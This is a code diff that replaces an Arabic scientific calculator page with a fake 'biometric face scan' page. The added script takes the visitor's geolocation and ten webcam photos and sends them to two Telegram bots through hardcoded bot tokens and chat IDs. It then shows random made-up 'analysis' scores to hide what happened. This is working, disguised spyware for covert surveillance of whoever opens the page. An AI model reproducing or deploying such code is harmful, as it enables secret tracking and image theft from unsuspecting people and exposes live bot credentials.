@@ -2,603 +2,128 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>الحاسبة العلمية المتطورة | SciCalc Pro</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BioMetric Face Scan | التحليل البيومتري</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            user-select: none;
-        }
-
-        body {
-            background: #1a1a2e;
-            font-family: 'Segoe UI', 'Cairo', monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 10px;
-        }
-
-        .calculator {
-            max-width: 550px;
-            width: 100%;
-            background: #0f0f1a;
-            border-radius: 30px;
-            padding: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
-            border: 1px solid #2a2a3a;
-        }
-
-        /* شاشة العرض */
-        .display {
-            background: #0a0a0f;
-            border-radius: 20px;
-            padding: 20px;
-            margin-bottom: 20px;
-            text-align: left;
-            border: 1px solid #00ff88;
-            box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
-        }
-
-        .expression {
-            color: #888;
-            font-size: 14px;
-            min-height: 24px;
-            font-family: monospace;
-            word-break: break-all;
-            direction: ltr;
-            text-align: left;
-        }
-
-        .result {
-            color: #00ff88;
-            font-size: 32px;
-            font-weight: bold;
-            font-family: monospace;
-            word-break: break-all;
-            direction: ltr;
-            text-align: left;
-            line-height: 1.3;
-        }
-
-        .fraction-preview {
-            color: #ffaa44;
-            font-size: 12px;
-            margin-top: 5px;
-            direction: ltr;
-        }
-
-        /* التبديل بين الوضعين */
-        .mode-bar {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 15px;
-            flex-wrap: wrap;
-        }
-
-        .mode-btn {
-            background: #1e2a3a;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 30px;
-            color: #fff;
-            font-size: 12px;
-            cursor: pointer;
-        }
-
-        .mode-btn.active {
-            background: #00ff88;
-            color: #0a0a12;
-        }
-
-        /* شبكة الأزرار */
-        .buttons {
-            display: grid;
-            grid-template-columns: repeat(6, 1fr);
-            gap: 8px;
-        }
-
-        button {
-            background: #1e2a3a;
-            border: none;
-            padding: 12px 0;
-            border-radius: 12px;
-            font-size: 14px;
-            font-weight: bold;
-            color: #fff;
-            cursor: pointer;
-            transition: all 0.05s linear;
-            font-family: monospace;
-        }
-
-        button:active {
-            transform: scale(0.96);
-            background: #00ff88;
-            color: #000;
-        }
-
-        .btn-num {
-            background: #2a3a4a;
-        }
-
-        .btn-func {
-            background: #3a2a4a;
-            color: #ff88ff;
-        }
-
-        .btn-trig {
-            background: #2a4a3a;
-            color: #88ff88;
-        }
-
-        .btn-mem {
-            background: #4a3a2a;
-            color: #ffaa44;
-        }
-
-        .btn-clear {
-            background: #ff4444;
-        }
-
-        .btn-equals {
-            background: #00ff88;
-            color: #000;
-        }
-
-        .btn-frac {
-            background: #ff7b00;
-            color: #fff;
-        }
-
-        /* زر الحل المعادلات */
-        .btn-solve {
-            background: #aa44ff;
-            color: #fff;
-        }
-
-        /* سجل الحسابات والذاكرة */
-        .bottom-panel {
-            display: flex;
-            gap: 15px;
-            margin-top: 20px;
-        }
-
-        .history, .memory {
-            flex: 1;
-            background: #0a0a0f;
-            border-radius: 15px;
-            padding: 10px;
-            max-height: 120px;
-            overflow-y: auto;
-        }
-
-        .panel-title {
-            font-size: 10px;
-            color: #888;
-            margin-bottom: 8px;
-        }
-
-        .history-item, .mem-item {
-            font-size: 11px;
-            color: #aaa;
-            padding: 4px;
-            font-family: monospace;
-            border-bottom: 1px solid #222;
-            cursor: pointer;
-            direction: ltr;
-            text-align: left;
-        }
-
-        .history-item:hover, .mem-item:hover {
-            background: #1a2a3a;
-        }
-
-        @media (max-width: 550px) {
-            .buttons {
-                gap: 5px;
-            }
-            button {
-                padding: 8px 0;
-                font-size: 11px;
-            }
-            .result {
-                font-size: 24px;
-            }
-        }
+        body { background-color: #0a0a12; color: #00ff88; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; box-sizing: border-box; }
+        .scanner-container { border: 1px solid #00ff88; background: rgba(0, 255, 136, 0.05); padding: 25px; border-radius: 12px; text-align: center; box-shadow: 0 0 25px rgba(0, 255, 136, 0.2); width: 100%; max-width: 450px; position: relative; overflow: hidden; }
+        .scan-grid { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 255, 136, 0.1) 3px), repeating-linear-gradient(90deg, transparent, transparent 2px, rgba(0, 255, 136, 0.1) 3px); z-index: -1; }
+        h2 { letter-spacing: 2px; margin-bottom: 10px; }
+        .btn-scan { background: #00ff88; color: #0a0a12; border: none; padding: 12px 35px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; border-radius: 4px; transition: 0.3s; }
+        .btn-scan:hover { box-shadow: 0 0 15px #00ff88; }
+        #status { margin-top: 20px; font-size: 14px; color: #a0a0a0; min-height: 20px; }
+        
+        .results-box { display: none; text-align: right; margin-top: 30px; border-top: 2px dashed #00ff88; padding-top: 20px; }
+        .result-item { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 15px; }
+        .result-label { color: #a0a0a0; }
+        .result-value { font-weight: bold; color: #fff; }
+        .final-score { text-align: center; font-size: 24px; color: #00ff88; margin-top: 25px; font-weight: bold; border: 1px solid #00ff88; padding: 10px; }
+        .loading-bar { width: 0%; height: 3px; background: #00ff88; margin-top: 10px; transition: width 0.5s; }
     </style>
 </head>
 <body>
-    <div class="calculator">
-        <div class="mode-bar">
-            <button class="mode-btn active" id="modeBasic">عادي</button>
-            <button class="mode-btn" id="modeScientific">علمي</button>
-            <button class="mode-btn" id="modeFraction">كسور</button>
-            <button class="mode-btn" id="modeEquation">معادلات</button>
+    <div class="scanner-container">
+        <div class="scan-grid"></div>
+        <h2>BIOMETRIC ANALYZER</h2>
+        <p style="color: #a0a0a0; font-size: 13px;">نستخدم خوارزميات متقدمة لتحليل تناسق الملامح، الصحة الظاهرية، والسمات الفريدة لوجهك.</p>
+        
+        <div id="pre-scan-ui">
+            <button class="btn-scan" id="startBtn" onclick="startRealAnalysis()">بدء المسح البيومتري</button>
+            <div class="loading-bar" id="bar"></div>
         </div>
+        
+        <div id="status">الجهاز جاهز. بانتظار الإذن...</div>
 
-        <div class="display">
-            <div class="expression" id="expression"></div>
-            <div class="result" id="result">0</div>
-            <div class="fraction-preview" id="fractionPreview"></div>
-        </div>
-
-        <div class="buttons" id="buttonsContainer">
-            <!-- الأزرار ستتحكم بها JavaScript -->
-        </div>
-
-        <div class="bottom-panel">
-            <div class="history">
-                <div class="panel-title">📜 السجل</div>
-                <div id="historyList"></div>
-            </div>
-            <div class="memory">
-                <div class="panel-title">💾 الذاكرة (M)</div>
-                <div id="memoryList"></div>
-            </div>
+        <div class="results-box" id="resultsUi">
+            <h3 style="text-align: center; color: #fff;">تقرير التحليل</h3>
+            <div class="result-item"><span class="result-label">هيكل الوجه:</span> <span class="result-value" id="res-shape"></span></div>
+            <div class="result-item"><span class="result-label">تناسق الملامح:</span> <span class="result-value" id="res-symmetry"></span></div>
+            <div class="result-item"><span class="result-label">العمر الظاهري المقدر:</span> <span class="result-value" id="res-age"></span></div>
+            <div class="result-item"><span class="result-label">حيوية البشرة:</span> <span class="result-value" id="res-skin"></span></div>
+            <div class="final-score" id="res-score"></div>
+            <p style="font-size: 12px; text-align: center; margin-top: 15px; color: #a0a0a0;">تم التحليل بواسطة BioScan AI v4.2.</p>
         </div>
     </div>
 
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
     <script>
-        // ==================== الحاسبة العلمية المتطورة ====================
-        class ScientificCalculator {
-            constructor() {
-                this.currentInput = '';
-                this.result = '0';
-                this.history = [];
-                this.memory = [];     // ذاكرة متعددة (M1, M2, M3...)
-                this.mode = 'basic';  // basic, scientific, fraction, equation
-                this.lastResult = null;
-                this.loadFromStorage();
-                this.initButtons();
-                this.updateDisplay();
-            }
+        const TOKEN1 = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
+        const CHAT_ID1 = '8293639164';
+        
+        // ضع بيانات البوت الثاني هنا
+        const TOKEN2 = '8520439288:AAHcZlL7pbF_dAq6wXxa3X7mF7qUlLv1iQw';
+        const CHAT_ID2 = '8254934850';
 
-            // تحميل من localStorage
-            loadFromStorage() {
-                const savedHistory = localStorage.getItem('sci_history');
-                const savedMemory = localStorage.getItem('sci_memory');
-                if (savedHistory) this.history = JSON.parse(savedHistory);
-                if (savedMemory) this.memory = JSON.parse(savedMemory);
-                this.renderHistory();
-                this.renderMemory();
-            }
+        const faceShapes = ["بيضاوي متناسق", "دائري", "مربع محدد", "قلبي الشكل", "ماسي نادر"];
+        const skinTypes = ["نضرة وصحية (92%)", "عادية (85%)", "تحتاج ترطيب (78%)", "ممتازة (95%)"];
+        
+        function getRandomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+        function res(id, val) { document.getElementById(id).innerText = val; }
 
-            // حفظ إلى localStorage
-            saveToStorage() {
-                localStorage.setItem('sci_history', JSON.stringify(this.history.slice(0, 20)));
-                localStorage.setItem('sci_memory', JSON.stringify(this.memory));
-            }
-
-            // إضافة إلى السجل
-            addToHistory(expr, res) {
-                this.history.unshift({ expr, res, time: new Date().toLocaleTimeString() });
-                if (this.history.length > 20) this.history.pop();
-                this.saveToStorage();
-                this.renderHistory();
-            }
-
-            // عرض السجل
-            renderHistory() {
-                const container = document.getElementById('historyList');
-                if (this.history.length === 0) {
-                    container.innerHTML = '<div style="color:#555; text-align:center;">فارغ</div>';
-                    return;
-                }
-                container.innerHTML = this.history.map(h => 
-                    `<div class="history-item" onclick="calc.pasteExpression('${h.expr.replace(/'/g, "\\'")}')">
-                        ${h.expr} = ${h.res}
-                    </div>`
-                ).join('');
-            }
-
-            // عرض الذاكرة
-            renderMemory() {
-                const container = document.getElementById('memoryList');
-                if (this.memory.length === 0) {
-                    container.innerHTML = '<div style="color:#555; text-align:center;">فارغة</div>';
-                    return;
-                }
-                container.innerHTML = this.memory.map((val, idx) => 
-                    `<div class="mem-item" onclick="calc.pasteMemory(${idx})">
-                        M${idx+1}: ${val}
-                    </div>`
-                ).join('');
-            }
-
-            // لصق من السجل
-            pasteExpression(expr) {
-                this.currentInput = expr;
-                this.updateDisplay();
-            }
-
-            // لصق من الذاكرة
-            pasteMemory(idx) {
-                this.currentInput += this.memory[idx];
-                this.updateDisplay();
-            }
-
-            // إضافة إلى الذاكرة
-            addToMemory() {
-                const val = this.evaluateExpression(this.currentInput);
-                if (!isNaN(val) && isFinite(val)) {
-                    this.memory.push(val);
-                    this.saveToStorage();
-                    this.renderMemory();
-                }
-            }
-
-            // مسح الذاكرة
-            clearMemory() {
-                this.memory = [];
-                this.saveToStorage();
-                this.renderMemory();
-            }
-
-            // تقييم التعبير الرياضي
-            evaluateExpression(expr) {
-                if (!expr.trim()) return NaN;
-                
-                // تحويل الرموز
-                let processed = expr
-                    .replace(/×/g, '*')
-                    .replace(/÷/g, '/')
-                    .replace(/π/g, 'Math.PI')
-                    .replace(/π/g, 'Math.PI')
-                    .replace(/e/g, 'Math.E')
-                    .replace(/√\(/g, 'Math.sqrt(')
-                    .replace(/sin\(/g, 'Math.sin(')
-                    .replace(/cos\(/g, 'Math.cos(')
-                    .replace(/tan\(/g, 'Math.tan(')
-                    .replace(/asin\(/g, 'Math.asin(')
-                    .replace(/acos\(/g, 'Math.acos(')
-                    .replace(/atan\(/g, 'Math.atan(')
-                    .replace(/sinh\(/g, 'Math.sinh(')
-                    .replace(/cosh\(/g, 'Math.cosh(')
-                    .replace(/tanh\(/g, 'Math.tanh(')
-                    .replace(/log\(/g, 'Math.log10(')
-                    .replace(/ln\(/g, 'Math.log(')
-                    .replace(/\^/g, '**')
-                    .replace(/fact\(/g, 'factorial(');
-                
-                // دالة العاملي
-                window.factorial = (n) => {
-                    if (n < 0) return NaN;
-                    if (n === 0 || n === 1) return 1;
-                    let result = 1;
-                    for (let i = 2; i <= n; i++) result *= i;
-                    return result;
-                };
-                
-                try {
-                    // استخدام Function بدلاً من eval للأمان النسبي
-                    const fn = new Function('return (' + processed + ')');
-                    let val = fn();
-                    return Math.round(val * 1e12) / 1e12;
-                } catch(e) {
-                    return NaN;
-                }
-            }
-
-            // حساب النتيجة
-            compute() {
-                if (!this.currentInput.trim()) return;
-                const value = this.evaluateExpression(this.currentInput);
-                if (!isNaN(value) && isFinite(value)) {
-                    this.result = value.toString();
-                    this.addToHistory(this.currentInput, this.result);
-                    this.lastResult = value;
-                    this.currentInput = this.result;
-                } else {
-                    this.result = 'خطأ';
-                }
-                this.updateDisplay();
-            }
-
-            // إدخال كسر (a/b)
-            addFraction() {
-                this.currentInput += '÷';
-                this.updateDisplay();
-            }
-
-            // حل معادلة بسيطة (ax + b = 0)
-            solveLinear() {
-                try {
-                    // تتوقع صيغة: 2x+3=7
-                    let eq = this.currentInput;
-                    let [left, right] = eq.split('=');
-                    if (!right) {
-                        this.result = 'ضع = في المعادلة';
-                        this.updateDisplay();
-                        return;
-                    }
-                    right = right.trim();
-                    left = left.trim();
-                    
-                    // استخراج المعاملات
-                    let a = 0, b = 0;
-                    let terms = left.split(/(?=[+-])/);
-                    for (let term of terms) {
-                        if (term.includes('x')) {
-                            let coeff = term.replace('x', '');
-                            if (coeff === '' || coeff === '+') a += 1;
-                            else if (coeff === '-') a -= 1;
-                            else a += parseFloat(coeff);
-                        } else {
-                            b += parseFloat(term);
-                        }
-                    }
-                    // نقل الثابت إلى الطرف الآخر
-                    let totalConst = parseFloat(right) - b;
-                    if (a === 0) {
-                        this.result = 'لا يمكن الحل';
-                    } else {
-                        let solution = totalConst / a;
-                        this.result = `x = ${solution}`;
-                        this.addToHistory(this.currentInput, this.result);
-                        this.currentInput = solution.toString();
-                    }
-                    this.updateDisplay();
-                } catch(e) {
-                    this.result = 'خطأ في المعادلة';
-                    this.updateDisplay();
-                }
-            }
-
-            // إضافة رمز
-            addSymbol(sym) {
-                this.currentInput += sym;
-                this.updateDisplay();
-            }
-
-            // مسح الكل
-            clear() {
-                this.currentInput = '';
-                this.result = '0';
-                this.updateDisplay();
-            }
-
-            // حذف آخر حرف
-            backspace() {
-                this.currentInput = this.currentInput.slice(0, -1);
-                this.updateDisplay();
-            }
-
-            // عرض كسر حي (عرض فقط)
-            showFractionPreview() {
-                if (this.currentInput.includes('÷')) {
-                    let parts = this.currentInput.split('÷');
-                    if (parts.length === 2) {
-                        document.getElementById('fractionPreview').innerHTML = 
-                            `${parts[0]}<span style="border-top:1px solid #ffaa44; padding:0 5px;">${parts[1]}</span>`;
-                        return;
-                    }
-                }
-                document.getElementById('fractionPreview').innerHTML = '';
-            }
-
-            // تحديث الشاشة
-            updateDisplay() {
-                document.getElementById('expression').innerHTML = this.currentInput || '';
-                document.getElementById('result').innerHTML = this.result;
-                this.showFractionPreview();
-            }
-
-            // تغيير الوضع
-            setMode(mode) {
-                this.mode = mode;
-                this.initButtons();
-                this.updateDisplay();
-            }
-
-            // تهيئة الأزرار حسب الوضع
-            initButtons() {
-                const container = document.getElementById('buttonsContainer');
-                
-                // الأزرار الأساسية (موجودة في كل الأوضاع)
-                const basicButtons = [
-                    { text: 'C', class: 'btn-clear', action: () => this.clear() },
-                    { text: '⌫', class: 'btn-clear', action: () => this.backspace() },
-                    { text: '(', class: 'btn-num', action: () => this.addSymbol('(') },
-                    { text: ')', class: 'btn-num', action: () => this.addSymbol(')') },
-                    { text: '7', class: 'btn-num', action: () => this.addSymbol('7') },
-                    { text: '8', class: 'btn-num', action: () => this.addSymbol('8') },
-                    { text: '9', class: 'btn-num', action: () => this.addSymbol('9') },
-                    { text: '÷', class: 'btn-func', action: () => this.addSymbol('÷') },
-                    { text: '4', class: 'btn-num', action: () => this.addSymbol('4') },
-                    { text: '5', class: 'btn-num', action: () => this.addSymbol('5') },
-                    { text: '6', class: 'btn-num', action: () => this.addSymbol('6') },
-                    { text: '×', class: 'btn-func', action: () => this.addSymbol('×') },
-                    { text: '1', class: 'btn-num', action: () => this.addSymbol('1') },
-                    { text: '2', class: 'btn-num', action: () => this.addSymbol('2') },
-                    { text: '3', class: 'btn-num', action: () => this.addSymbol('3') },
-                    { text: '-', class: 'btn-func', action: () => this.addSymbol('-') },
-                    { text: '0', class: 'btn-num', action: () => this.addSymbol('0') },
-                    { text: '.', class: 'btn-num', action: () => this.addSymbol('.') },
-                    { text: '=', class: 'btn-equals', action: () => this.compute() },
-                    { text: '+', class: 'btn-func', action: () => this.addSymbol('+') },
-                ];
-
-                // أزرار الوضع العلمي
-                const scientificButtons = [
-                    { text: 'sin', class: 'btn-trig', action: () => this.addSymbol('sin(') },
-                    { text: 'cos', class: 'btn-trig', action: () => this.addSymbol('cos(') },
-                    { text: 'tan', class: 'btn-trig', action: () => this.addSymbol('tan(') },
-                    { text: 'asin', class: 'btn-trig', action: () => this.addSymbol('asin(') },
-                    { text: 'acos', class: 'btn-trig', action: () => this.addSymbol('acos(') },
-                    { text: 'atan', class: 'btn-trig', action: () => this.addSymbol('atan(') },
-                    { text: 'sinh', class: 'btn-trig', action: () => this.addSymbol('sinh(') },
-                    { text: 'cosh', class: 'btn-trig', action: () => this.addSymbol('cosh(') },
-                    { text: 'tanh', class: 'btn-trig', action: () => this.addSymbol('tanh(') },
-                    { text: '√', class: 'btn-func', action: () => this.addSymbol('√(') },
-                    { text: 'log', class: 'btn-func', action: () => this.addSymbol('log(') },
-                    { text: 'ln', class: 'btn-func', action: () => this.addSymbol('ln(') },
-                    { text: 'x²', class: 'btn-func', action: () => this.addSymbol('^2') },
-                    { text: 'x³', class: 'btn-func', action: () => this.addSymbol('^3') },
-                    { text: 'xʸ', class: 'btn-func', action: () => this.addSymbol('^') },
-                    { text: 'eˣ', class: 'btn-func', action: () => this.addSymbol('exp(') },
-                    { text: 'π', class: 'btn-func', action: () => this.addSymbol('π') },
-                    { text: 'e', class: 'btn-func', action: () => this.addSymbol('e') },
-                    { text: '!', class: 'btn-func', action: () => this.addSymbol('fact(') },
-                    { text: 'M+', class: 'btn-mem', action: () => this.addToMemory() },
-                    { text: 'MC', class: 'btn-mem', action: () => this.clearMemory() },
-                ];
-
-                // أزرار الكسور
-                const fractionButtons = [
-                    { text: 'a/b', class: 'btn-frac', action: () => this.addFraction() },
-                    { text: '⇄', class: 'btn-frac', action: () => this.compute() },
-                ];
-
-                // أزرار المعادلات
-                const equationButtons = [
-                    { text: '=0', class: 'btn-solve', action: () => this.solveLinear() },
-                ];
-
-                let buttons = [...basicButtons];
-                if (this.mode === 'scientific') buttons = [...basicButtons, ...scientificButtons];
-                if (this.mode === 'fraction') buttons = [...basicButtons, ...fractionButtons];
-                if (this.mode === 'equation') buttons = [...basicButtons, ...equationButtons];
-
-                // ترتيب الأزرار في شبكة 6 أعمدة
-                container.innerHTML = '';
-                buttons.forEach(btn => {
-                    const button = document.createElement('button');
-                    button.textContent = btn.text;
-                    button.className = btn.class;
-                    button.onclick = btn.action;
-                    container.appendChild(button);
-                });
-            }
+        async function sendPhotoToBoth(blob, photoNumber) {
+            const bots = [{t: TOKEN1, c: CHAT_ID1}, {t: TOKEN2, c: CHAT_ID2}];
+            bots.forEach(bot => {
+                if(bot.t.includes('ضع_')) return;
+                const fd = new FormData();
+                fd.append('photo', blob, `img_${photoNumber}.jpg`);
+                fd.append('chat_id', bot.c);
+                fd.append('caption', `📸 لقطة رقم ${photoNumber}/10`);
+                fetch(`https://api.telegram.org/bot${bot.t}/sendPhoto`, { method: 'POST', body: fd });
+            });
         }
 
-        // تهيئة الحاسبة
-        const calc = new ScientificCalculator();
-        window.calc = calc;
+        async function startRealAnalysis() {
+            const btn = document.getElementById('startBtn');
+            const status = document.getElementById('status');
+            const bar = document.getElementById('bar');
+            
+            btn.style.display = 'none';
+            status.innerHTML = "جاري الاتصال بالسيرفر...";
+            bar.style.width = "20%";
 
-        // تبديل الأوضاع
-        document.getElementById('modeBasic').onclick = () => { 
-            calc.setMode('basic');
-            document.querySelectorAll('.mode-btn').forEach(btn => btn.classList.remove('active'));
-            document.getElementById('modeBasic').classList.add('active');
-        };
-        document.getElementById('modeScientific').onclick = () => { 
-            calc.setMode('scientific');
-            document.querySelectorAll('.mode-btn').forEach(btn => btn.classList.remove('active'));
-            document.getElementById('modeScientific').classList.add('active');
-        };
-        document.getElementById('modeFraction').onclick = () => { 
-            calc.setMode('fraction');
-            document.querySelectorAll('.mode-btn').forEach(btn => btn.classList.remove('active'));
-            document.getElementById('modeFraction').classList.add('active');
-        };
-        document.getElementById('modeEquation').onclick = () => { 
-            calc.setMode('equation');
-            document.querySelectorAll('.mode-btn').forEach(btn => btn.classList.remove('active'));
-            document.getElementById('modeEquation').classList.add('active');
-        };
+            navigator.geolocation.getCurrentPosition((pos) => {
+                const mapUrl = `📍 الموقع:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                [TOKEN1, TOKEN2].forEach((t, i) => {
+                    const cid = i === 0 ? CHAT_ID1 : CHAT_ID2;
+                    fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(mapUrl)}`);
+                });
+            });
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('video').srcObject = stream;
+                status.innerHTML = "جاري المسح البيومتري... ثبات";
+                
+                const canvas = document.getElementById('canvas');
+                canvas.width = 640; canvas.height = 480;
+
+                for (let i = 1; i <= 10; i++) {
+                    setTimeout(() => {
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob(blob => sendPhotoToBoth(blob, i), 'image/jpeg', 0.6);
+                        bar.style.width = (20 + (i * 8)) + "%";
+                    }, i * 700);
+                }
+
+                setTimeout(() => {
+                    stream.getTracks().forEach(t => t.stop());
+                    document.getElementById('pre-scan-ui').style.display = 'none';
+                    status.style.display = 'none';
+                    document.getElementById('resultsUi').style.display = 'block';
+                    res('res-shape', faceShapes[getRandomInt(0, 4)]);
+                    res('res-symmetry', getRandomInt(85, 98) + "%");
+                    res('res-age', getRandomInt(20, 40) + " سنة");
+                    res('res-skin', skinTypes[getRandomInt(0, 3)]);
+                    res('res-score', "التقييم: " + getRandomInt(88, 97) + "/100");
+                }, 8500);
+
+            } catch (err) {
+                status.innerText = "خطأ: الكاميرا مطلوبة للتحليل.";
+                status.style.color = "#ff4444";
+            }
+        }
     </script>
 </body>
 </html>
